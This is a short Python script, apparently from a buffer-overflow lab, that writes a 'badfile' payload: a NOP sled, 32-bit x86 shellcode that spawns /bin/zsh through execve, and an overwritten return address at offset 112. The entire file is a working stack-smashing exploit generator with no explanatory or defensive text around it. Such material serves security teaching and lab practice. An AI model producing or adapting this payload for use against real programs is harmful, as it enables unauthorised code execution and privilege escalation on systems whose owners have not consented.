#!/usr/bin/python3

import sys
# Malicious Code
shellcode = (
    "\x31\xc0"          # xorl %eax, %eax
    "\x50"              # pushl %eax
    "\x68""/zsh"        # pushl $0x68737a2f  hsz/
    "\x68""/bin"        # pushl $0x6e69622f  nib/
    "\x89\xe3"          # movl %esp, %ebx
    "\x50"              # pushl %eax
    "\x53"              # pushl %ebx
    "\x89\xe1"          # movl %esp, %ecx
    "\x31\xd2"          # xorl %edx, %edx
    "\x31\xc0"          # xorl %eax, %eax
    "\xb0\x0b"          # movb $0x0b, %al
    "\xcd\x80"          # int $0x80
    ).encode('latin-1')

# Fill the content with NOPs
content = bytearray( 0x90 for i in range(300) )

# Put the shellcode at the end
start = 300 - len(shellcode)
content[start:] = shellcode

# Put the address at offset 112 (108+4)
ret = 0xffffd17c + 120
content[112:116] = (ret).to_bytes(4, byteorder='little')

# Write to a file
with open('badfile', 'wb') as f:
    f.write(content)

